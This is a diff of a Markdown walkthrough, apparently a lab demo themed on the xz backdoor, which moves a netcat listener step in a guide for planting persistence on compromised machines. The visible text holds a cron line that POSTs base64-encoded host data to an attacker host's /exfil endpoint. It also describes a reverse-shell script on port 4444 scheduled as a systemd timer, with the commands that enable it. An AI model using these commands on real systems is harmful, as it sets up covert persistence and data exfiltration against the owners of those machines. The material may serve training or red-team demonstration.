@@ -233,9 +233,15 @@ On both machines (as user xzattacker) run `crontab -e`and add the following cron
 0 * * * * echo "$(hostname) $(date)"|base64 >/tmp/x.hostname && curl -i -X POST http:/KALILINUX-IP/exfil -H "Content-Type: text/plain" --data-binary "@/tmp/x.hostname" && rm -f /tmp/x.hostname
 ```
 
+## Create listener on Kali Linux
+For our fallback backdoor we will create a new listener on our Kali Linux (best in another new windows to have both listeners up and running)
+```
+nc -nlvp 4444
+```
+
 ## Create fallback Backdoor Script on both systems 
-In case our crontab entry is detected we assume that our backchannel might not work anymore. In this case we will trigger a second backdoor that is scheduled every 5 minutes as a systemd service
-Create this backdoor script that opens up a simple connection back to our Kali linux on port 4444. Replace the KALILINUX-IP with your real IP
+In case our crontab entry is detected we assume that our backchannel triggered via curl might not work anymore. In this case we will use a second backdoor that is scheduled every 5 minutes as a systemd service
+Create this backdoor script that opens up a simple connection back to our Kali linux on port 4444. Replace the KALILINUX-IP with your real IP.
 For the demo let's create the backdoor in `/tmp/backdoor.sh` and make it executable with `chmod +x /tmp/backdoor.sh`.
 ```
 #!/bin/bash
@@ -277,10 +283,5 @@ sudo systemctl daemon-reload
 sudo systemctl enable xz.timer
 sudo systemctl start xz.timer
 systemctl list-timers
-```
-
-## Start Listener on Kali Linux
-```
-nc -nlvp 4444
 ```
 
